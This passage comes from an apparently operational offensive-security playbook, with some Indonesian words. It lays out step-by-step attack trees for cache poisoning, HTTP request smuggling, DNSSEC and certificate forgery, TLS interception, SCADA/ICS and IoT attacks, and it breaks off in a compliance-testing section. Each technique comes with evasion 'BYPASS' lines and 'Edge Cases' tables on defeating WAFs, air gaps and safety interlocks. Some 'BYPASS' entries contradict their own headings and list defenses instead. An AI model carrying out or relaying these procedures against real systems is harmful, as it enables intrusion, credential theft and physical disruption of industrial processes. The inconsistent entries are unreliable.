   BYPASS: Use DOM-based cached XSS

2. REDIRECT_CACHE
   WHAT: Open redirect via cache
   HOW:
   ├── Poison cache ke include open redirect
   ├── Redirect embedded in cached page
   ├── Users clicking link redirected ke attacker
   ├── Phishing page delivered
   └── Credentials harvested
   DETECTION: Cached redirect detection
   BYPASS: Use JavaScript-based redirect

3. DOS_CACHE
   WHAT: Cache-based DoS
   HOW:
   ├── Identify cache partition boundaries
   ├── Poison cache ke serve invalid/error content
   ├── All victims served broken cached page
   ├── Legitimate content unavailable
   └── Service disruption achieved
   DETECTION: Cache anomaly detection
   BYPASS: Use cache size exhaustion

4. TAKEOVER_CACHE
   WHAT: Subdomain takeover via cache
   HOW:
   ├── Combine cache poisoning with subdomain takeover
   ├── Poison cache on target subdomain
   ├── Serve attacker-controlled content
   ├── Cached content served ke all victims
   └── Persistent hijacking achieved
   DETECTION: Cache-subdomain correlation
   BYPASS: Use CDN-level takeover

FALLBACK:
Unkeyed Header → Cookie Poisoning → Fat GET →
Parameter Cloaking → Cache Deception → Key Injection → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Cache uses request body in key    │ 1. Try URL-only cache key bypass
                                  │ 2. Use query parameter injection
                                  │ 3. Exploit Vary header misconfiguration
Cache has short TTL (< 1 min)     │ 1. Re-poison frequently
                                  │ 2. Target high-traffic endpoints
                                  │ 3. Use persistent payload
CDN strips unkeyed headers        │ 1. Try alternate header names
                                  │ 2. Use HTTP/2 smuggling
                                  │ 3. Exploit CDN-specific headers
Cache segments by Vary header     │ 1. Manipulate Accept header
                                  │ 2. Use Content-Type confusion
                                  │ 3. Target CDN-specific cache rules
Poisoned cache triggers WAF       │ 1. Use obfuscated payload
                                  │ 2. Delay payload activation
                                  │ 3. Use CSS/JS-based payload
Cache uses hash-based keys        │ 1. Identify key derivation algorithm
                                  │ 2. Craft collisions
                                  │ 3. Exploit weak hash function
```

---

### 30.10 HTTP Request Smuggling

```
SMUGGLING_ATTACKS (6):

1. CL_TE
   WHAT: Content-Length vs Transfer-Encoding conflict
   HOW:
   ├── Send request with both CL and TE headers
   ├── Front-end uses Content-Length
   ├── Back-end uses Transfer-Encoding
   ├── Craft payload that splits ke two requests
   └── Smuggled request executes on back-end
   DETECTION: CL/TE header conflict monitoring
   BYPASS: Use TE.CL variant

2. TE_CL
   WHAT: Transfer-Encoding vs Content-Length conflict
   HOW:
   ├── Send request with both TE and CL headers
   ├── Front-end uses Transfer-Encoding
   ├── Back-end uses Content-Length
   ├── Craft request where TE body differs dari CL
   └── Smuggled request appended ke next request
   DETECTION: TE/CL header conflict detection
   BYPASS: Use obfuscated TE

3. TE_TE
   WHAT: Obfuscated Transfer-Encoding
   HOW:
   ├── Send request with obfuscated TE header
   ├── Use spaces/tabs/encoding ke bypass front-end
   ├── Front-end ignores obfuscated TE
   ├── Back-end processes TE normally
   └── Request body smuggled through
   DETECTION: Obfuscated TE header detection
   BYPASS: Use double TE header

4. CL_CL
   WHAT: Duplicate Content-Length
   HOW:
   ├── Send request with two Content-Length headers
   ├── Front-end uses first CL
   ├── Back-end uses second CL
   ├── Craft payload splitting request
   └── Smuggled request injected
   DETECTION: Duplicate CL header detection
   BYPASS: Use whitespace manipulation

5. H2C_SMUGGLING
   WHAT: HTTP/2 cleartext smuggling
   HOW:
   ├── Connect ke server via HTTP/2 cleartext
   ├── Craft HTTP/2 frame with smuggled payload
   ├── Front-end upgrades HTTP/2 ke HTTP/1.1
   ├── Payload interpreted differently
   └── Smuggled request executes
   DETECTION: H2C upgrade monitoring
   BYPASS: Use HTTP/2 downgrade

6. HTTP2_DOWNGRADE
   WHAT: HTTP/2 to HTTP/1.1 downgrade
   HOW:
   ├── Send HTTP/2 request with smuggled HTTP/1.1 body
   ├── Server downgrades ke HTTP/1.1
   ├── Smuggled request processed
   ├── Header/body parsing conflicts
   └── Request injection achieved
   DETECTION: HTTP version downgrade monitoring
   BYPASS: Use HTTP/3 smuggling

SMUGGLING_EXPLOIT (4):

1. XSS_SMUGGLE
   WHAT: XSS via request smuggling
   HOW:
   ├── Smuggle request containing XSS payload
   ├── Victim's request appended ke smuggled request
   ├── Response contains XSS payload
   ├── XSS executes ke victim's browser
   └── Cookies/credentials stolen
   DETECTION: Smuggled XSS detection
   BYPASS: Use DOM-based smuggled XSS

2. CREDENTIAL_SMUGGLE
   WHAT: Credential theft via smuggling
   HOW:
   ├── Smuggle request that triggers credential prompt
   ├── Victim's next request appends ke smuggled request
   ├── Back-end processes both requests as one
   ├── Credentials leaked ke attacker
   └── Use stolen credentials ke access accounts
   DETECTION: Smuggled credential extraction
   BYPASS: Use timing-based extraction

3. CACHE_SMUGGLE
   WHAT: Cache poisoning via smuggling
   HOW:
   ├── Smuggle request that poisons cache entry
   ├── Poisoned response cached by CDN/front-end
   ├── All subsequent users served poisoned content
   ├── Persistent XSS/redirect delivered
   └── Mass compromise achieved
   DETECTION: Cache smuggling correlation
   BYPASS: Use partial cache poisoning

4. RCE_SMUGGLE
   WHAT: RCE via request smuggling
   HOW:
   ├── Smuggle request containing command injection
   ├── Back-end processes smuggled command
   ├── Command execution ke back-end server
   ├── Attacker gains remote access
   └── Full system compromise
   DETECTION: Smuggled RCE detection
   BYPASS: Use file write via smuggling

FALLBACK:
CL.TE → TE.CL → TE.TE → CL.CL → H2C →
HTTP/2 Downgrade → Direct Smuggle → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
Server normalizes TE header       │ 1. Use obfuscated TE variants
consistently                      │ 2. Try double TE encoding
                                  │ 3. Use HTTP/2 specific vectors
Both servers use same parsing     │ 1. Target middleware differences
logic                             │ 2. Use malformed header variants
                                  │ 3. Exploit whitespace handling
Connection uses keep-alive only   │ 1. Force connection close
                                  │ 2. Use pipelined requests
                                  │ 3. Exploit connection pooling
WAF detects smuggling patterns    │ 1. Use slow loris-style smuggling
                                  │ 2. Fragment across multiple requests
                                  │ 3. Use HTTP/2 frame manipulation
Back-end uses HTTP/2 exclusively  │ 1. Use HTTP/2 to HTTP/1.1 downgrade
                                  │ 2. Exploit h2c upgrade path
                                  │ 3. Use HTTP/2 frame smuggling
Load balancer normalizes headers  │ 1. Target LB-specific parsing quirks
                                  │ 2. Use hop-by-hop header manipulation
                                  │ 3. Exploit LB back-end differences
```

---

### 30.11 DNSSEC Bypass

```
DNSSEC_ATTACKS (5):

1. ZONE_WALKING
   WHAT: NSEC zone walking enumeration
   HOW:
   ├── Query zone with NSEC-signed responses
   ├── Collect NSEC records
   ├── Infer next names from record hashes
   ├── Iterate hingga full zone mapped
   └── Extract hidden/private records
   DETECTION: NSEC query volume anomaly detection
   BYPASS: Use NSEC5-style or black-lies signing

2. ALGO_DOWNGRADE
   WHAT: Algorithm downgrade attack
   HOW:
   ├── Identify supported DNSSEC algorithms
   ├── Strip strongest DS/DNSKEY records
   ├── Force resolver to accept weak signature
   ├── Downgrade authentication strength
   └── Forge response with weak key material
   DETECTION: Algorithm policy enforcement monitoring
   BYPASS: Enforce minimum algorithm policy

3. KEY_ROLL_BYPASS
   WHAT: Key rollover bypass
   HOW:
   ├── Observe key rollover schedule
   ├── Capture old ZSK/KSK material
   ├── Inject stale valid signatures
   ├── Exploit propagation delay window
   └── Replay forged zone data
   DETECTION: Rollover timing anomaly detection
   BYPASS: Use alternate method

4. CDS_CDSKEY
   WHAT: CDS/CDNSKEY manipulation
   HOW:
   ├── Obtain write access to parent zone
   ├── Modify CDS/CDNSKEY records
   ├── Redirect trust anchor to attacker key
   ├── Sign malicious zone content
   └── Serve forged records as authentic
   DETECTION: CDS/CDNSKEY change monitoring
   BYPASS: Secure parent zone registration process

5. DENIAL_ENCRYPTION
   WHAT: NSEC3 hash collision/brute force
   HOW:
   ├── Harvest NSEC3 hashes from responses
   ├── Brute-force hashes offline
   ├── Reconstruct zone names from hash
   ├── Create hash collisions to mask queries
   └── Enumerate entire zone
   DETECTION: NSEC3 query pattern monitoring
   BYPASS: Rotate NSEC3 salts frequently

DNSSEC_ABUSE (3):

1. SIG_FORGE
   WHAT: Signature forgery with weak algorithm
   HOW:
   ├── Identify weak algorithm (e.g., RSAMD5)
   ├── Recover key or exploit algorithm weakness
   ├── Sign malicious RRset
   ├── Inject forged signature
   └── Validator accepts forged data
   DETECTION: Signature verification logging
   BYPASS: Enforce minimum algorithm strength

2. REPLAY_ATTACK
   WHAT: Signed response replay
   HOW:
   ├── Capture valid signed responses
   ├── Modify TTL via responder
   ├── Serve replay in attacker location
   ├── Validator accepts valid signature
   └── Poisoned answer cached
   DETECTION: DNSSEC TTL/validity monitoring
   BYPASS: Use short signature validity windows

3. CACHE_POISON
   WHAT: DNSSEC bypass for cache poisoning
   HOW:
   ├── Bypass or degrade DNSSEC validation
   ├── Spoof additional DNS records
   ├── Inject malicious answer into cache
   ├── TTL propagates poisoned entry
   └── Victim resolves attacker-controlled IP
   DETECTION: Resolver validation state audit
   BYPASS: Enable strict DNSSEC validation mode

FALLBACK:
Zone Walking → Algorithm Downgrade → Key Roll Bypass →
CDS Manipulation → NSEC3 Collision → Direct Poison → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
NSEC enumeration blocked by NSEC5 │ 1. Fall back to algorithm downgrade
                                  │ 2. Try key rollover bypass
Validator enforces RSA-2048       │ 1. Move to key rollover bypass
                                  │ 2. Attempt CDS/CDNSKEY manipulation
                                  │ 3. Alert operator
Parent zone locked (no CDS write) │ 1. Skip to NSEC3 collision
                                  │ 2. Attempt direct cache poisoning
Replay window expired (short TTL) │ 1. Use cache poisoning instead
                                  │ 2. Increase poisoning speed
                                  │ 3. Alert operator
Cache poisons quarantined quickly │ 1. Retry via alternate resolver
                                  │ 2. Use alternate method
```

---

### 30.12 Certificate Forgery

```
CERT_ATTACKS (6):

1. ROGUE_CA
   WHAT: Rogue CA certificate generation
   HOW:
   ├── Generate root CA key pair
   ├── Create rogue CA cert (BasicConstraints)
   ├── Sign malicious leaf certificates
   ├── Trust root on target system
   └── Intercept HTTPS traffic
   DETECTION: Certificate trust store audit
   BYPASS: Remove rogue root from trust store

2. NTLM_RELAY_CERT
   WHAT: NTLM relay to ADCS HTTP enrollment
   HOW:
   ├── Capture NTLM authentication
   ├── Relay to ADCS /certsrv enrollment
   ├── Request certificate on victim's behalf
   ├── Obtain attacker-controlled PFX
   └── Authenticate as victim
   DETECTION: ADCS enrollment anomaly monitoring
   BYPASS: Enforce EPA and relay protections

3. SHADOW_CRED_CERT
   WHAT: Shadow credentials to certificate
   HOW:
   ├── Obtain write to msDS-KeyCredentialLink
   ├── Create shadow credential for target
   ├── Authenticate as target via PKINIT
   ├── Request certificate with device key
   └── Obtain TGT / persist as victim
   DETECTION: KeyCredentialLink modification alert
   BYPASS: Enable device unlock and cert audit

4. CERT_DUPLICATION
   WHAT: Certificate duplication
   HOW:
   ├── Steal private key material
   ├── Duplicate certificate with same serial
   ├── Re-issue to attacker-controlled key
   ├── Present duplicated certificate
   └── Gain identity impersonation
   DETECTION: Certificate serial collision monitoring
   BYPASS: Use alternate method

5. WEAK_KEY
   WHAT: Weak key exploitation (RSA 1024)
   HOW:
   ├── Identify RSA-1024/small key certificate
   ├── Factor modulus (CADO-NFS)
   ├── Recover private key
   ├── Sign forged certificates
   └── Impersonate legitimate service
   DETECTION: Key size policy enforcement
   BYPASS: Enforce RSA-2048+/ECC policy

6. SELF_SIGNED
   WHAT: Self-signed certificate injection
   HOW:
   ├── Generate self-signed cert for target
   ├── Install into trust store (RCE/AD)
   ├── Present forged cert to victim
   ├── Victim trusts forged certificate
   └── MITM encrypted traffic
   DETECTION: Trust store tamper detection
   BYPASS: Enforce CA-signed certificate policy

CERT_ABUSE (4):

1. CERT_TRANSPARENCY
   WHAT: CT log abuse
   HOW:
   ├── Query CT logs for domain certificates
   ├── Enumerate subdomains/internal names
   ├── Identify weak or leaked certificates
   ├── Use leaked names in targeting
   └── Prepare targeted attack
   DETECTION: CT log query monitoring
   BYPASS: Use alternate method

2. OCSP_STAPLING
   WHAT: OCSP stapling bypass
   HOW:
   ├── Serve cached OCSP assertion
   ├── Strip must-staple extension
   ├── Rewrite OCSP responses
   ├── Serve revoked certificate
   └── Client accepts revoked cert
   DETECTION: OCSP responder monitoring
   BYPASS: Enforce must-staple and CRL checks

3. PIN_BYPASS
   WHAT: Certificate pinning bypass
   HOW:
   ├── Identify pinned certificates
   ├── Hook pinning API (Frida/Xposed)
   ├── Patch app pinning logic
   ├── Load attacker CA into app
   └── Intercept pinned traffic
   DETECTION: App integrity/pinning attestation
   BYPASS: Use alternate method

4. CA_COMPROMISE
   WHAT: CA private key compromise
   HOW:
   ├── Obtain CA signing key material
   ├── Issue rogue cert via cross-CA chain
   ├── Sign malicious certificates
   ├── MITM HTTPS traffic
   └── Browser validates trust chain
   DETECTION: CA incident and log anomaly feed
   BYPASS: Add CA to distrust list

FALLBACK:
Rogue CA → NTLM Relay → Shadow Credentials →
Weak Key → Self-Signed → Direct Injection → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
LDAPS / EPA blocks NTLM relay     │ 1. Move to shadow credentials
                                  │ 2. Attempt weak key exploitation
                                  │ 3. Alert operator
KeyCredentialLink not writable    │ 1. Fall back to weak key attack
                                  │ 2. Move to rogue CA injection
CA enforces minimum key size      │ 1. Switch to rogue CA route
                                  │ 2. Attempt self-signed injection
WAF blocks PFX export tooling     │ 1. Adjust enrollment payload
                                  │ 2. Use certificate duplication
                                  │ 3. Alert operator
ADCS HTTP enrollment disabled     │ 1. Fall back to self-signed
                                  │ 2. Compromise trust store directly
```

---

### 30.13 TLS 1.3 Attacks

```
TLS13_ATTACKS (5):

1. MIDDLEBOX_COMPAT
   WHAT: Middlebox compatibility downgrade
   HOW:
   ├── Present legacy record version
   ├── Force compat mode plaintext metadata
   ├── Intercept session ticket/SNI plaintext
   ├── Downgrade at middlebox boundary
   └── Extract session metadata
   DETECTION: TLS record version anomaly detection
   BYPASS: Disable middlebox compatibility mode

2. INTERCEPTION
   WHAT: TLS 1.3 interception (enterprise)
   HOW:
   ├── Deploy corporate MITM proxy
   ├── Install root CA on endpoints
   ├── Forward-resign certificates
   ├── Intercept TLS 1.3 sessions
   └── Decrypt and analyze traffic
   DETECTION: TLS EKM/channel identity verification
   BYPASS: Use alternate method

3. HANDSHAKE_LOG
   WHAT: Handshake metadata leakage
   HOW:
   ├── Capture ClientHello
   ├── Extract SNI, ALPN, cipher suites
   ├── Fingerprint client (JA3/JA4)
   ├── Correlate with other logs
   └── Profile session and target
   DETECTION: TLS metadata logging in EDR
   BYPASS: Use ECH and SNI padding

4. SESSION_RESUMPTION
   WHAT: Session ticket abuse
   HOW:
   ├── Steal session ticket (pre-shared key)
   ├── Replay ticket on new connection
   ├── Resume session without full auth
   ├── Inject 0-RTT early data
   └── Reuse victim's session state
   DETECTION: Session ticket reuse anomaly
   BYPASS: Short ticket lifetime and rotation

5. KEY_LOGGING
   WHAT: TLS key logging (SSLKEYLOGFILE)
   HOW:
   ├── Obtain process/environment access
   ├── Set SSLKEYLOGFILE or hook key funcs
   ├── Log NSS key log entries
   ├── Decrypt captured pcap offline
   └── Recover plaintext traffic
   DETECTION: Env var/key log file monitoring
   BYPASS: Use alternate method

TLS_ABUSE (4):

1. CIPHER_DOWNGRADE
   WHAT: Cipher suite downgrade
   HOW:
   ├── Strip strong suites from ClientHello
   ├── Force negotiation of weak cipher
   ├── Weak crypto enables offline attack
   ├── Capture session
   └── Decrypt traffic
   DETECTION: TLS server cipher policy audit
   BYPASS: Enforce strong cipher policy

2. CERT_STRIP
   WHAT: Certificate stripping
   HOW:
   ├── MITM the HTTP to HTTPS upgrade
   ├── Strip redirect to HTTPS
   ├── Downgrade connection to HTTP
   ├── Intercept plaintext
   └── Modify or extract data
   DETECTION: HSTS enforcement/upgrade detection
   BYPASS: Enforce HSTS preload and redirects

3. MITM_TLS
   WHAT: TLS man-in-the-middle
   HOW:
   ├── Position at network chokepoint
   ├── Intercept ClientHello
   ├── Present forged certificate
   ├── Decrypt and re-encrypt traffic
   └── Modify traffic in transit
   DETECTION: Certificate anomaly detection
   BYPASS: Use alternate method

4. TRUSTED_CA
   WHAT: Trusted CA abuse
   HOW:
   ├── Identify high-trust CA (compromised/misuse)
   ├── Forge certificate under that CA
   ├── Re-sign intercepted traffic
   ├── Victim trust chain validates
   └── MITM succeeds
   DETECTION: CA transparency/audit alerts
   BYPASS: Add CA to distrust list

FALLBACK:
Middlebox Downgrade → Interception → Session Abuse →
Cipher Downgrade → Cert Strip → Direct MITM → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
TLS EKM detects interception      │ 1. Fall back to key logging
                                  │ 2. Attempt session ticket abuse
                                  │ 3. Alert operator
Client uses ECH (encrypted SNI)   │ 1. Reduce handshake metadata scope
                                  │ 2. Move to cipher downgrade
Session tickets rotated frequently│ 1. Switch to 0-RTT early data abuse
                                  │ 2. Fall back to certificate strip
HSTS preloaded domain             │ 1. Use rogue CA instead of strip
                                  │ 2. Attempt direct MITM
                                  │ 3. Alert operator
Pinned certificate prevents MITM  │ 1. Hook pinning into endpoint
                                  │ 2. Use alternate method
```

---

### 30.14 SCADA/ICS Attacks

```
SCADA_PROTOCOLS (5):

1. MODBUS_ATTACK
   WHAT: Modbus TCP/RTU exploitation
   HOW:
   ├── Scan Modbus/TCP port 502
   ├── Identify slave units and coils
   ├── Enumerate function codes
   ├── Write to coils/registers
   └── Manipulate industrial process
   DETECTION: Modbus packet whitelist/anomaly
   BYPASS: Use alternate method

2. DNP3_ATTACK
   WHAT: DNP3 protocol exploitation
   HOW:
   ├── Scan DNP3 port 20000
   ├── Enumerate outstation addresses
   ├── Issue DNP3 read/write commands
   ├── Modify data points/objects
   └── Disrupt control operations
   DETECTION: DNP3 deep packet inspection
   BYPASS: Use alternate method

3. IEC61850
   WHAT: IEC 61850 (GOOSE/SV) attack
   HOW:
   ├── Capture GOOSE/SV multicast traffic
   ├── Analyze datasets/control blocks
   ├── Spoof GOOSE messages (MAC spoof)
   ├── Inject fake SV measurements
   └── Suppress safety trips
   DETECTION: GOOSE sequence/message monitoring
   BYPASS: Use alternate method

4. OPCUA_ATTACK
   WHAT: OPC UA exploitation
   HOW:
   ├── Discover OPC UA servers (port 4840)
   ├── Brute force app/user credentials
   ├── Enumerate nodes/namespaces
   ├── Read/write variables and call methods
   └── Manipulate process data
   DETECTION: OPC UA access logging/AAA
   BYPASS: Use alternate method

5. BACNET_ATTACK
   WHAT: BACnet protocol exploitation
   HOW:
   ├── Scan UDP/47808 BACnet devices
   ├── Who-Is/I-Am device discovery
   ├── Issue Read/WriteProperty commands
   ├── Manipulate HVAC/building controls
   └── Bypass physical security controls
   DETECTION: BACnet command anomaly detection
   BYPASS: Use alternate method

SCADA_EXPLOIT (5):

1. PLC_REPROGRAM
   WHAT: PLC reprogramming
   HOW:
   ├── Connect to PLC engineering port
   ├── Upload malicious ladder/ST logic
   ├── Insert logic into scan cycle
   ├── Override safety interlocks
   └── Control industrial process
   DETECTION: PLC logic/firmware integrity hash
   BYPASS: Use alternate method

2. HMI_ATTACK
   WHAT: HMI exploitation
   HOW:
   ├── Access HMI (web/RDP/VNC)
   ├── Brute force HMI credentials
   ├── Manipulate operator screens
   ├── Control pumps/valves remotely
   └── Mask process manipulation
   DETECTION: HMI login/change audit
   BYPASS: Use alternate method

3. SCADA_ENUM
   WHAT: SCADA device enumeration
   HOW:
   ├── Scan ICS network ranges
   ├── Fingerprint devices (banners/Shodan)
   ├── Identify device and firmware
   ├── Map network topology
   └── Prepare targeted exploitation
   DETECTION: ICS scan/anomaly detection
   BYPASS: Use alternate method

4. PROTOCOL_FUZZ
   WHAT: Protocol fuzzing
   HOW:
   ├── Capture protocol traffic
   ├── Build protocol template
   ├── Fuzz fields (boofuzz/AFL)
   ├── Crash device or trigger DOS
   └── Identify exploit primitives
   DETECTION: Protocol fuzzing anomaly traffic
   BYPASS: Use alternate method

5. MITM_SCADA
   WHAT: SCADA man-in-the-middle
   HOW:
   ├── ARP spoof PLC/HMI/RTU
   ├── Intercept real-time process data
   ├── Relay spoofed values to HMI
   ├── Alter commands to PLC
   └── Hide process manipulation
   DETECTION: ARP anomaly in ICS network
   BYPASS: Use alternate method

FALLBACK:
Modbus → DNP3 → IEC 61850 → OPC UA → BACnet →
PLC Reprogram → HMI Attack → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
PLC has application whitelisting  │ 1. Fall back to MITM on network
                                  │ 2. Target HMI instead
                                  │ 3. Alert operator
GOOSE spoof blocked (IEC 62351)   │ 1. Move to protocol fuzzing
                                  │ 2. Attempt DNP3 exploitation
OPC UA enforces cert validation   │ 1. Reduce to read-only enumeration
                                  │ 2. Try alternate protocol vector
ICS network is air-gapped         │ 1. Pivot via engineering workstation
                                  │ 2. Use physical USB/OT drop
                                  │ 3. Alert operator
HMI protected by MFA              │ 1. Reprogram PLC over the network
                                  │ 2. Use alternate method
```

---

### 30.15 IoT Attacks

```
IOT_ATTACKS (8):

1. FIRMWARE_EXTRACT
   WHAT: Firmware extraction (JTAG/UART/SPI)
   HOW:
   ├── Identify UART/JTAG header on PCB
   ├── Connect hardware debug interface
   ├── Dump flash via SPI (flashrom)
   ├── Recover firmware/keys
   └── Save for offline analysis
   DETECTION: Tamper-evident seals/hardware IDS
   BYPASS: Use alternate method

2. FIRMWARE_ANALYSIS
   WHAT: Firmware reverse engineering
   HOW:
   ├── Obtain firmware (extract/OTA)
   ├── Unpack rootfs with binwalk
   ├── Identify filesystem and binaries
   ├── Extract hardcoded creds/keys
   └── Find vulnerabilities to exploit
   DETECTION: Firmware integrity monitoring
   BYPASS: Use alternate method

3. DEFAULT_CRED
   WHAT: Default credential testing
   HOW:
   ├── Identify device model/firmware
   ├── Query default credential database
   ├── Try admin/admin, root, etc.
   ├── Use manufacturer backdoor creds
   └── Gain device access
   DETECTION: Device credential policy monitoring
   BYPASS: Enforce unique per-device credentials

4. MQTT_EXPLOIT
   WHAT: MQTT protocol exploitation
   HOW:
   ├── Scan MQTT TCP/1883 or TLS 8883
   ├── Connect without authentication
   ├── Subscribe to device topics
   ├── Publish forged messages
   └── Control IoT devices
   DETECTION: MQTT auth/ACL monitoring
   BYPASS: Use alternate method

5. COAP_EXPLOIT
   WHAT: CoAP protocol exploitation
   HOW:
   ├── Scan CoAP UDP/5683
   ├── Send discovery requests
   ├── Exploit unauthenticated endpoints
   ├── Modify device resources
   └── RCE via vulnerable handlers
   DETECTION: CoAP endpoint auth monitoring
   BYPASS: Use alternate method

6. ZIGBEE_ATTACK
   WHAT: Zigbee protocol attack
   HOW:
   ├── Sniff Zigbee frames (CC2531)
   ├── Extract network key material
   ├── Replay/forge packets
   ├── Join network as rogue node
   └── Control devices or cause DOS
   DETECTION: Zigbee security mode/key monitoring
   BYPASS: Use alternate method

7. ZWAVE_ATTACK
   WHAT: Z-Wave protocol attack
   HOW:
   ├── Sniff Z-Wave RF traffic
   ├── Intercept S0/S2 key exchange
   ├── Downgrade to legacy security mode
   ├── Replay/forge Z-Wave commands
   └── Control locks/sensors
   DETECTION: Z-Wave key/S2 mode monitoring
   BYPASS: Use alternate method

8. BLE_EXPLOIT
   WHAT: BLE (Bluetooth Low Energy) exploitation
   HOW:
   ├── Scan BLE devices (Ubertooth/Bluez)
   ├── Enumerate GATT services
   ├── Test no-pairing/legacy pairing
   ├── Send crafted GATT commands
   └── Hijack device functions
   DETECTION: BLE pairing/attestation monitoring
   BYPASS: Use alternate method

IOT_EXPLOIT (5):

1. DEVICE_TAKEOVER
   WHAT: Full device compromise
   HOW:
   ├── Exploit firmware/device vulnerability
   ├── Obtain root/shell on device
   ├── Persist across reboots
   ├── Deploy tooling and backdoor
   └── Full control of device
   DETECTION: Device behavior anomaly/attestation
   BYPASS: Use alternate method

2. NETWORK_PIVOT
   WHAT: IoT network pivot
   HOW:
   ├── Compromise IoT device
   ├── Enable forwarding on device
   ├── Route traffic through device
   ├── Scan internal network
   └── Attack internal hosts
   DETECTION: IoT-origin traffic anomaly
   BYPASS: Use alternate method

3. DATA_EXFIL
   WHAT: IoT data exfiltration
   HOW:
   ├── Access device storage
   ├── Compromise cloud sync account
   ├── Extract sensor data/credentials
   ├── Use covert exfil channel (DNS/MQTT)
   └── Send data to attacker server
   DETECTION: Data egress anomaly detection
   BYPASS: Use alternate method

4. DOS_IOT
   WHAT: IoT denial of service
   HOW:
   ├── Identify exposed device service
   ├── Flood device (SYN/UDP)
   ├── Trigger reboot via updater
   ├── Disable device functionality
   └── Persistent bricked state
   DETECTION: IoT device health/availability monitor
   BYPASS: Use alternate method

5. BOTNET_RECRUIT
   WHAT: Botnet recruitment
   HOW:
   ├── Exploit default/vulnerable IoT device
   ├── Deliver bot binary (Mirai-style)
   ├── Connect device to C2
   ├── Wait for attack command
   └── Launch DDoS
   DETECTION: C2 communication/behavioral detection
   BYPASS: Use alternate method

FALLBACK:
Firmware Extract → Default Cred → MQTT Exploit →
CoAP Exploit → Zigbee → BLE → Device Takeover → ALERT
```

**Edge Cases:**
```
SCENARIO                          │ RESPONSE
──────────────────────────────────┼──────────────────────────────────
JTAG/UART physically locked       │ 1. Fall back to OTA firmware fetch
                                  │ 2. Use default credential testing
Firmware is encrypted/signed      │ 1. Reduce to runtime analysis
                                  │ 2. Move to protocol exploitation
MQTT requires TLS and certs       │ 1. Move to CoAP exploitation
                                  │ 2. Attempt Zigbee/ZWave vector
Zigbee uses new security mode     │ 1. Switch to BLE exploitation
                                  │ 2. Use alternate method
Device updates wipe persistence   │ 1. Re-exploit via default credentials
                                  │ 2. Persist via network pivot
                                  │ 3. Alert operator
```

---

### 30.16 Compliance Testing

```
PCI_DSS (8):
1. CARD_DATA_SCAN
   WHAT: PAN detection scan menggunakan regex dan network capture
   HOW:
   ├── Define PAN regex pattern (Visa, Mastercard, Amex, Discover)
   ├── Scan database dumps, log files, dan SIEM output
   ├── Network capture untuk PCI segment traffic
   ├── Analyze packet payloads untuk card data patterns
   └── Flag unencrypted PAN storage dan transmission
   DETECTION: DLP alerts on PAN patterns
   BYPASS: Use tokenized PAN references

2. ENCRYPTION_VALIDATE
   WHAT: Encryption validation (SSL/TLS) terhadap cardholder data
   HOW:
   ├── TLS version scan (SSLv3, TLS 1.0 disabled check)
   ├── Certificate chain validation dan expiry check
   ├── Cipher suite enumeration (weak ciphers: RC4, DES, 3DES)
   ├── HSTS header verification
   └── PCI DSS Requirement 4 compliance mapping
   DETECTION: TLS monitoring and certificate transparency logs
   BYPASS: Use client-side encryption bypass

3. ACCESS_CONTROL
   WHAT: Access control testing terhadap cardholder data environment
   HOW:
   ├── Enumerate access control lists pada database dan application
   ├── Test role-based access (DBA, app user, auditor)
   ├── Attempt privilege escalation via stored procedures
   ├── Verify least privilege principle
   └── Test segregation of duties controls
   DETECTION: Access control audit logs
   BYPASS: Use compromised service account

4. NETWORK_SEGMENT
   WHAT: Network segmentation testing untuk cardholder data environment
   HOW:
   ├── Map network segments (CDE, P2PE, cardholder data flow)
   ├── Verify firewall rules between segments
   ├── Test lateral movement restrictions
   ├── Validate VLAN isolation dan ACLs
   └── Document segmentation gaps
   DETECTION: Network segmentation monitoring
   BYPASS: Use approved connection pathway

5. VULNERABILITY_SCAN
   WHAT: Vulnerability scanning pada cardholder data environment
   HOW:
   ├── Run authenticated vulnerability scan terhadap CDE
   ├── Check for missing patches (OS, application, firmware)
   ├── Configuration baseline review
   ├── Test for known CVEs in scope systems
   └── Prioritize findings berdasarkan CVSS score
   DETECTION: Vulnerability scan detection (IDS/IPS)
   BYPASS: Use alternate method

6. PENETRATION_TEST
   WHAT: Penetration testing terhadap cardholder data environment
   HOW:
   ├── Scope definition dan rules of engagement
   ├── External/internal attack simulation
   ├── Web application testing (OWASP Top 10)
   ├── Network layer exploitation
   └── Social engineering components
   DETECTION: Honeypots dan deception technology
   BYPASS: Use alternate method

7. LOG_REVIEW
   WHAT: Log review testing untuk PCI DSS compliance
   HOW:
   ├── Verify logging pada all access to CDE
   ├── Test log integrity (tamper detection)
   ├── Validate log retention policies (minimum 1 tahun)
   ├── Review centralized logging configuration
   └── Test log alerting mechanisms
   DETECTION: Log integrity monitoring
   BYPASS: Use alternate method

8. POLICY_REVIEW
   WHAT: Policy compliance review terhadap PCI DSS requirements
   HOW:
   ├── Document inventory (policies, procedures, standards)
   ├── Gap analysis against PCI DSS v4.0 requirements
   ├── Review information security policy
   ├── Validate security awareness training program
   └── Compile compliance report dengan remediation roadmap
   DETECTION: Policy audit dan gap analysis
   BYPASS: Use alternate method

HIPAA (6):
1. PHI_SCAN
   WHAT: PHI (Protected Health Information) scan pada sistem healthcare
   HOW:
   ├── Define PHI data patterns (names, MRN, DOB, insurance ID)
   ├── Scan databases, file shares, dan email systems
   ├── Network traffic analysis untuk unencrypted PHI
   ├── Review cloud storage repositories
   └── Map PHI data flow dan storage locations
   DETECTION: DLP policies for PHI patterns
   BYPASS: Use de-identified data references

2. ACCESS_AUDIT
   WHAT: Access audit testing terhadap PHI systems
   HOW:
   ├── Review user access rights to EHR systems
   ├── Test authentication mechanisms (MFA, SSO)
   ├── Verify minimum necessary access principle
   ├── Audit privileged account activity
   └── Validate termination access procedures
   DETECTION: Access audit log review
   BYPASS: Use legitimate access pathway

3. ENCRYPTION_VALIDATE
   WHAT: Encryption at rest/in transit validation untuk PHI
   HOW:
   ├── Verify AES-256 encryption at rest pada databases
